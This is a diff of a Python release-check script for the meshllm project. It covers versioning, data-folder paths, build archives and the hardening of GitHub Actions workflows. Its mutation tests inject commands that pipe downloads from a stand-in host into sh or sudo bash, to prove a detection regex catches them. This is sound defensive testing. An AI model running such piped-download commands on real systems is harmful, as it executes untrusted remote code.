@@ -4,7 +4,8 @@ the workflows. Offline: nothing is built, nothing is downloaded and no workflow 
 * one version string (meshllm/__init__.py, imports nothing), valid semver, shown by `--version`, in the dashboard's status and by setup --check;
 * docs/CHANGELOG.md has a section for it, and the release workflow's tag check (scripts/release_check.py, the same code) agrees;
 * meshllm/paths.py: unchanged behaviour from source, a per-user folder when `sys.frozen` (faked here), --data-dir and MESHLLM_DATA_DIR on top;
-* the workflows: least privilege, no pull_request_target, no expression inside a `run:`, pinned actions, and the five required check names untouched.
+* the workflows: least privilege, no pull_request_target / workflow_run / secrets other than the run's own token, no download piped into a shell, no
+  expression inside a `run:`, pinned actions, and the five required check names untouched (each rule is also proven to fire, on a mutated scratch copy).
 """
 import ast, io, os, re, subprocess, sys, tarfile, tempfile, zipfile
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -88,7 +89,7 @@ class A:       # a stand-in for the parsed command line
 class Faked:
     """Pretend to be a packaged program (sys.frozen, sys._MEIPASS) for the duration of a `with`, then put everything back."""
     def __init__(self, meipass, home): self.meipass, self.home = meipass, home
-    HOMES = ("HOME", "USERPROFILE", "XDG_DATA_HOME", "APPDATA")      # pointed at a throwaway folder, so nothing is ever made in the real home folder
+    HOMES = ("HOME", "USERPROFILE", "XDG_DATA_HOME", "APPDATA", "LOCALAPPDATA")      # pointed at a throwaway folder, so nothing is ever made in the real home folder
     def __enter__(self):
         self.had = (hasattr(sys, "frozen"), hasattr(sys, "_MEIPASS"))
         self.env = {k: os.environ.get(k) for k in self.HOMES}
@@ -110,10 +111,10 @@ check("from source the log folder is still logs/ in the project", paths.log_dir(
 check("--db defaults to that file, as before", __import__("meshllm.bridge", fromlist=["x"]).build_parser().get_default("db") == str(root / "audit.db"))
 check("from source the resources are in the project folder", paths.resource_root() == root and (paths.resource_root() / "meshllm" / "static" / "index.html").is_file())
 home = "/home/someone"
-win = paths.user_data_dir("win32", {"APPDATA": "C:\\Users\\x\\AppData\\Roaming"}, "C:\\Users\\x")
-check("Windows: %APPDATA%\\meshllm", win.name == "meshllm" and str(win).startswith("C:\\Users\\x\\AppData\\Roaming"), win)
+win = paths.user_data_dir("win32", {"LOCALAPPDATA": "C:\\Users\\x\\AppData\\Local", "APPDATA": "C:\\Users\\x\\AppData\\Roaming"}, "C:\\Users\\x")
+check("Windows: %LOCALAPPDATA%\\meshllm (machine-local, not the roaming profile)", win.name == "meshllm" and str(win).startswith("C:\\Users\\x\\AppData\\Local") and "Roaming" not in str(win), win)
 nowin = str(paths.user_data_dir("win32", {}, "C:\\Users\\x"))
-check("Windows without APPDATA: AppData and Roaming under the home folder", nowin.startswith("C:\\Users\\x") and "AppData" in nowin and "Roaming" in nowin and nowin.endswith("meshllm"), nowin)
+check("Windows without LOCALAPPDATA: AppData and Local under the home folder", nowin.startswith("C:\\Users\\x") and "AppData" in nowin and "Local" in nowin and "Roaming" not in nowin and nowin.endswith("meshllm"), nowin)
 check("macOS: ~/Library/Application Support/meshllm", paths.user_data_dir("darwin", {}, home).as_posix() == home + "/Library/Application Support/meshllm")
 check("Linux: ~/.local/share/meshllm", paths.user_data_dir("linux", {}, home).as_posix() == home + "/.local/share/meshllm")
 check("Linux: $XDG_DATA_HOME wins", paths.user_data_dir("linux", {"XDG_DATA_HOME": "/xdg"}, home).as_posix() == "/xdg/meshllm")
@@ -139,6 +140,9 @@ with Faked(bundle, fakehome):
     check("packaged: --data-dir moves the database, creates the folder and wins over everything", ns.db == os.path.join(os.path.realpath(mine), "audit.db") and os.path.isdir(mine) and str(got) == os.path.realpath(mine), (ns.db, got))
     check("--data-dir also moves the log folder", paths.log_dir() == paths.data_dir() / "logs" and str(paths.log_dir()).startswith(os.path.realpath(mine)), paths.log_dir())
     paths.set_data_dir(None)
+    from meshllm.diagnostics import Diagnostics as _D
+    d = _D(object())
+    check("packaged: Diagnostics' start-at-login check returns nothing (the installer is not part of the program)", d._autostart() is None and d._auto[1] is None)
 check("after the fake, everything is as it was", not paths.is_frozen() and paths.data_dir(ENV) == root)
 
 tmpdata = tempfile.mkdtemp(prefix="datadir_")
@@ -183,13 +187,13 @@ os.makedirs(os.path.join(tree, "meshllm", "static")); os.makedirs(os.path.join(t
 code = ("import sys; sys.frozen = True; sys._MEIPASS = sys.argv[1]\n"
         "from meshllm import evals, webui, paths, diagnostics\n"
         "print(evals.ROOT, evals.RESULTS, evals.DOCS, webui.STATIC, paths.data_dir(), diagnostics.ROOT)")
-env = dict(ENV, HOME=tmpdata, XDG_DATA_HOME=os.path.join(tmpdata, "xdg"), APPDATA=os.path.join(tmpdata, "appdata"), PYTHONDONTWRITEBYTECODE="1")
+env = dict(ENV, HOME=tmpdata, XDG_DATA_HOME=os.path.join(tmpdata, "xdg"), APPDATA=os.path.join(tmpdata, "appdata"), LOCALAPPDATA=os.path.join(tmpdata, "localappdata"), PYTHONDONTWRITEBYTECODE="1")
 p = subprocess.run([sys.executable, "-c", code, tree], cwd=ROOT, capture_output=True, text=True, env=env, timeout=120)
 got = p.stdout.split()
 check("packaged: evals and the dashboard read docs and static from the bundle, the data goes to the user folder",
       p.returncode == 0 and len(got) == 6 and got[0] == tree and got[1] == os.path.join(tree, "docs", "eval_results") and got[2] == os.path.join(tree, "docs")
       and got[3] == os.path.join(tree, "meshllm", "static") and got[4].startswith(tmpdata) and "meshllm" in got[4], (p.stdout, p.stderr[-300:]))
-check("packaged: importing wrote nothing into the data folder (it is created only when the bridge starts)", not os.path.exists(os.path.join(tmpdata, "xdg")) and not os.path.exists(os.path.join(tmpdata, "appdata")))
+check("packaged: importing wrote nothing into the data folder (it is created only when the bridge starts)", not any(os.path.exists(os.path.join(tmpdata, d)) for d in ("xdg", "appdata", "localappdata")))
 
 # ---- the build recipe
 check("the build name is meshllm-<version>-<os>-<arch>", BB.build_name("0.1.0", "linux", "x86_64") == "meshllm-0.1.0-linux-x86_64" and BB.build_name("1.2.3", "win32", "AMD64") == "meshllm-1.2.3-windows-x86_64"
@@ -201,17 +205,21 @@ os.makedirs(os.path.join(folder, "_internal")); open(os.path.join(folder, "meshl
 os.chmod(os.path.join(folder, "meshllm"), 0o755)
 tgz = BB.make_archive(folder, folder + ".tar.gz")
 with tarfile.open(tgz) as t:
+    owners = {(m.uid, m.gid, m.uname, m.gname) for m in t.getmembers()}
     names = t.getnames()
     mode = t.getmember("meshllm-9.9.9-linux-x86_64/meshllm").mode
 check("the tar.gz has the folder as its one top-level entry, and keeps the executable bit", all(n.split("/")[0] == "meshllm-9.9.9-linux-x86_64" for n in names) and "meshllm-9.9.9-linux-x86_64/_internal/lib.so" in names and (os.name == "nt" or mode & 0o111), (names, mode))
 zp = BB.make_archive(folder, folder + ".zip")
 with zipfile.ZipFile(zp) as z:
     zn = z.namelist()
+check("the tar.gz records no user or group of the builder", owners == {(0, 0, "", "")}, owners)
 check("the zip has the same layout", sorted(n.replace("\\", "/") for n in zn) == ["meshllm-9.9.9-linux-x86_64/_internal/lib.so", "meshllm-9.9.9-linux-x86_64/meshllm"], zn)
 check("folder_size adds the files up", BB.folder_size(folder) == 2)
 spec = read("scripts", "meshllm.spec")
 check("the recipe bundles the dashboard files and docs, and leaves out screenshots and the hand-off queue", "meshllm/static" in spec and '"docs"' in spec and "screenshots" in spec and "TODO.md" in spec)
 check("the recipe names the Bluetooth backend of every operating system, and pyserial", all(w in spec for w in ("bleak.backends.bluezdbus", "dbus_fast", "bleak.backends.winrt", "winrt", "bleak.backends.corebluetooth", "objc", "serial.tools.list_ports")))
+check("the recipe keeps the installer scripts (setup_env, setup_docker) out of the bundle", re.search(r'excludes = \[[^\]]*"setup_env"[^\]]*"setup_docker"', spec) is not None)
+check("the smoke test asserts the packaged demo has no autostart check", '"autostart"' in read("scripts", "smoke_binary.py") and "no start-at-login" in read("scripts", "smoke_binary.py"))
 check("the recipe is one-folder (exclude_binaries) and unpacked by nothing at start-up", "exclude_binaries=True" in spec and "COLLECT(" in spec and "upx=False" in spec)
 check("the entry point calls the bridge's main", "from meshllm.bridge import main" in read("scripts", "launcher.py"))
 req = read("scripts", "requirements-build.txt")
@@ -233,6 +241,36 @@ def load(name):
     if True in doc and "on" not in doc:       # YAML 1.1 reads the key `on` as the boolean True
         doc["on"] = doc.pop(True)
     return doc
+
+SHELL_PIPE = re.compile(r"(\bcurl\b|\bwget\b)[^\n]*\|\s*(sudo\s+(-\S+\s+)*)?(env\s+\S+\s+)?(ba|z|da|k)?sh\b|(\bcurl\b|\bwget\b)[^\n]*\|\s*(sudo\s+)?python3?\b|\b(ba|z|da)?sh\b\s+<\(\s*(curl|wget)\b|\bsource\s+<\(\s*(curl|wget)\b")
+
+def workflow_problems(folder):
+    """Rules every workflow in `folder` must keep, as a list of 'file: what is wrong' (empty = fine). Comments are ignored."""
+    out = []
+    for n in sorted(f for f in os.listdir(folder) if f.endswith(".yml")):
+        raw = open(os.path.join(folder, n), encoding="utf-8").read()
+        code = "\n".join(l for l in raw.splitlines() if not l.lstrip().startswith("#"))
+        for expr in re.findall(r"\$\{\{(.*?)\}\}", code, re.S):          # only inside ${{ }}: a script may call Python's own `secrets` module
+            for m in re.finditer(r"\bsecrets\s*(?:\.\s*([A-Za-z0-9_]+)|\[)", expr):
+                if m.group(1) != "GITHUB_TOKEN":
+                    out.append(f"{n}: uses secrets.{m.group(1) or '[...]'} (only secrets.GITHUB_TOKEN is allowed)")
+        if re.search(r"^\s*secrets:\s*inherit\s*$", code, re.M):
+            out.append(f"{n}: passes every secret on (secrets: inherit)")
+        for bad in ("pull_request_target", "workflow_run"):
+            if bad in code:
+                out.append(f"{n}: uses the {bad} trigger")
+        if yaml is None:
+            continue
+        doc = yaml.safe_load(raw)
+        if True in doc and "on" not in doc:
+            doc["on"] = doc.pop(True)
+        if n == "tests.yml" and set(doc["on"]) != {"push", "pull_request"}:
+            out.append(f"{n}: triggers are {sorted(doc['on'])}, expected exactly push and pull_request")
+        for j, job in doc["jobs"].items():
+            for st in job.get("steps", []):
+                if SHELL_PIPE.search(st.get("run", "")):
+                    out.append(f"{n}: job {j} pipes a download into a shell: {st['run'].strip()[:60]}")
+    return out
 
 REQUIRED = ["test (3.9)", "test (3.10)", "test (3.12)", "test (3.13)", "docker"]
 def job_names(doc):
@@ -262,10 +300,37 @@ if yaml:
     check("release.yml runs only when a version tag is pushed", rel["on"] == {"push": {"tags": ["v*.*.*"]}}, rel["on"])
     check("release.yml jobs: verify, test, build, checksums, publish, in that chain", list(rel["jobs"]) == ["verify", "test", "build", "checksums", "publish"]
           and rel["jobs"]["test"]["needs"] == "verify" and set(rel["jobs"]["build"]["needs"]) == {"verify", "test"} and rel["jobs"]["build"]["uses"] == "./.github/workflows/package.yml"
-          and rel["jobs"]["checksums"]["needs"] == "build" and rel["jobs"]["publish"]["needs"] == "checksums", list(rel["jobs"]))
+          and rel["jobs"]["checksums"]["needs"] == "build" and set(rel["jobs"]["publish"]["needs"]) == {"verify", "checksums"}, list(rel["jobs"]))
     for n, d in docs.items():
         check(f"{n}: the workflow-level token is read-only", d.get("permissions") == {"contents": "read"}, d.get("permissions"))
-        check(f"{n}: no pull_request_target", "pull_request_target" not in str(d["on"]) and "pull_request_target" not in read(".github", "workflows", n).replace("pull_request_target`", ""), d["on"])
+    check("tests.yml triggers are exactly push and pull_request", set(docs["tests.yml"]["on"]) == {"push", "pull_request"}, docs["tests.yml"]["on"])
+    check("no workflow uses another secret, pull_request_target, workflow_run, or pipes a download into a shell", workflow_problems(WORKFLOWS) == [], workflow_problems(WORKFLOWS))
+    # each rule must really fire: copy the workflows to a scratch folder, break one thing, expect that problem
+    import shutil
+    def mutated(file, old, new, expect):
+        scratch = tempfile.mkdtemp(prefix="wfmut_")
+        for f in names:
+            shutil.copy(os.path.join(WORKFLOWS, f), scratch)
+        text = open(os.path.join(scratch, file), encoding="utf-8").read()
+        assert old in text, (file, old)
+        open(os.path.join(scratch, file), "w", encoding="utf-8").write(text.replace(old, new, 1))
+        got = workflow_problems(scratch)
+        shutil.rmtree(scratch, ignore_errors=True)
+        return got and any(expect in g for g in got), got
+    for label, file, old, new, expect in (
+            ("a secret other than the run's token", "release.yml", "          GH_REPO:", "          NPM: ${{ secrets.NPM_TOKEN }}\n          GH_REPO:", "secrets.NPM_TOKEN"),
+            ("secrets: inherit", "release.yml", "    uses: ./.github/workflows/package.yml", "    uses: ./.github/workflows/package.yml\n    secrets: inherit", "secrets: inherit"),
+            ("the pull_request_target trigger", "package.yml", "  workflow_dispatch:\n", "  workflow_dispatch:\n  pull_request_target:\n", "pull_request_target"),
+            ("the workflow_run trigger", "package.yml", "  workflow_dispatch:\n", "  workflow_dispatch:\n  workflow_run:\n    workflows: [tests]\n", "workflow_run"),
+            ("an extra trigger in tests.yml", "tests.yml", "  pull_request:\n", "  pull_request:\n  schedule:\n    - cron: '0 0 * * *'\n", "expected exactly push and pull_request"),
+            ("curl piped into sh", "package.yml", "python -m pip install --upgrade pip", "curl -fsSL https://example.invalid/i | sh", "pipes a download"),
+            ("wget piped into sudo bash", "package.yml", "python -m pip install --upgrade pip", "wget -qO- https://example.invalid/i | sudo bash", "pipes a download"),
+            ("bash <(curl ...)", "package.yml", "python -m pip install --upgrade pip", "bash <(curl -s https://example.invalid/i)", "pipes a download")):
+        ok, got = mutated(file, old, new, expect)
+        check(f"mutation: {label} is caught", ok, got)
+    ok, got = mutated("release.yml", "          GH_REPO:", "          T: ${{ secrets.GITHUB_TOKEN }}\n          GH_REPO:", "secrets.")
+    check("mutation: secrets.GITHUB_TOKEN alone is allowed", not ok and not got, got)
+    check("a comment that merely mentions these things is not a violation", not SHELL_PIPE.search("echo curl and a pipe | tr a b") and not SHELL_PIPE.search("curl -fsS http://127.0.0.1:1/x | grep -q ok"))
     writers = {n: [j for j, job in d["jobs"].items() if any(v != "read" for v in (job.get("permissions") or {}).values())] for n, d in docs.items()}
     check("only release.yml's checksums and publish jobs ask for more than read", writers == {"tests.yml": [], "package.yml": [], "release.yml": ["checksums", "publish"]}, writers)
     check("only the publish job can write contents; only checksums gets id-token and attestations",
@@ -290,8 +355,13 @@ if yaml:
     check("release.yml verify: fetches the full history", any(s.get("with", {}).get("fetch-depth") == 0 for s in verify))
     check("release.yml runs the test suite before building", any("scripts/run_tests.py" in s.get("run", "") for j, s in steps(rel) if j == "test"))
     pub = [s for j, s in steps(rel) if j == "publish"]
-    check("release.yml publish: gh release create with the changelog notes, the archives and SHA256SUMS", any("gh release create" in s.get("run", "") and "--notes-file notes.md" in s["run"] and "SHA256SUMS" in s["run"] and "release_check.py notes" in s["run"] and "--verify-tag" in s["run"] for s in pub), pub)
-    check("release.yml publish: the token reaches gh through env", any(s.get("env", {}).get("GH_TOKEN") == "${{ github.token }}" for s in pub))
+    check("release.yml publish: gh release create with the notes file, the archives and SHA256SUMS, verifying the tag", any("gh release create" in s.get("run", "") and "--notes-file notes/notes.md" in s["run"] and "SHA256SUMS" in s["run"] and "--verify-tag" in s["run"] for s in pub), pub)
+    check("release.yml publish: the token and the repository reach gh through env", any(s.get("env", {}).get("GH_TOKEN") == "${{ github.token }}" and s["env"].get("GH_REPO") == "${{ github.repository }}" for s in pub))
+    check("release.yml publish: checks nothing out and runs no script of ours (the job that can write runs no repository code)", not any("checkout" in s.get("uses", "") for s in pub) and not any(re.search(r"\bpython3?\b|scripts/|\./", s.get("run", "").replace("./release", "")) for s in pub), pub)
+    check("release.yml verify: builds the release notes from the changelog and hands them over as an artifact", any('release_check.py notes "${TAG#v}" > notes.md' in s.get("run", "") for s in verify)
+          and any(s.get("uses", "").startswith("actions/upload-artifact@") and s["with"]["name"] == "release-notes" for s in verify), verify)
+    check("release.yml publish: a pre-release is judged on the version without build metadata (1.0.0+build-1 is not one)", any("${version%%+*}" in s.get("run", "") and "--prerelease" in s["run"] for s in pub))
+    check("release.yml and package.yml: checkouts that need no git credentials do not keep them", all(s.get("with", {}).get("persist-credentials") is False for n_ in ("release.yml", "package.yml") for j, s in steps(docs[n_]) if s.get("uses", "").startswith("actions/checkout@") and j != "verify"))
     check("release.yml checksums: attests the build provenance of the archives", any(s.get("uses", "").startswith("actions/attest-build-provenance@") and "meshllm-*.tar.gz" in s["with"]["subject-path"] and "meshllm-*.zip" in s["with"]["subject-path"] for j, s in steps(rel) if j == "checksums"))
     check("release.yml checksums: SHA256SUMS lists all three archives", any("sha256sum" in s.get("run", "") and "SHA256SUMS" in s["run"] and '= 3' in s["run"] for j, s in steps(rel) if j == "checksums"))
     pk = [s for j, s in steps(docs["package.yml"])]
@@ -301,9 +371,19 @@ if yaml:
 else:
     for n in ("release.yml", "package.yml", "tests.yml"):
         t = read(".github", "workflows", n)
-        check(f"{n}: read-only token at the top and no pull_request_target", re.search(r"^permissions:\n  contents: read\n", t, re.M) is not None and "pull_request_target" not in t.replace("no pull_request_target", ""))
+        check(f"{n}: read-only token at the top", re.search(r"^permissions:\n  contents: read\n", t, re.M) is not None)
+    check("no other secrets, no pull_request_target or workflow_run (text check)", workflow_problems(WORKFLOWS) == [], workflow_problems(WORKFLOWS))
     t = read(".github", "workflows", "release.yml")
     check("release.yml: tag trigger, tag check and ancestor check are there", 'tags:\n      - "v*.*.*"' in t and 'release_check.py check "$TAG"' in t and "merge-base --is-ancestor" in t and "gh release create" in t)
+
+# ---- the docs
+rel_doc = read("docs", "releasing.md")
+check("releasing.md: the checks protect against a mistaken tag, not a malicious pusher; the tag ruleset is the control", "**mistaken** tag" in rel_doc and "malicious" in rel_doc and "tag ruleset" in rel_doc and "`v*`" in rel_doc and "linear history" in rel_doc)
+check("releasing.md: attestation verification pins the signer workflow", "--signer-workflow TeamHarrisCali/MeshtasticLLM/.github/workflows/release.yml" in rel_doc)
+check("releasing.md: recovery mentions a leftover draft release; the checklist updates the 'none exists yet' sentences and the changelog date", "leftover draft release" in rel_doc and "none exists yet" in rel_doc and "date on the new changelog heading" in rel_doc)
+rd = read("README.md")
+check("README: names the platforms covered and says Ollama is separate", "Linux x86_64" in rd and "Windows x86_64" in rd and "Apple silicon only" in rd and "Intel Macs" in rd and "Ollama" in rd[rd.index("Download a program"):])
+check("the docs name the Windows data folder as %LOCALAPPDATA%", "%LOCALAPPDATA%" in read("docs", "setup.md") and "%LOCALAPPDATA%" in read("docs", "flags.md") and "%APPDATA%" not in read("docs", "setup.md") + read("docs", "flags.md"))
 
 print(f"\n{len(fails)} failed" if fails else "\nall passed")
 sys.exit(1 if fails else 0)
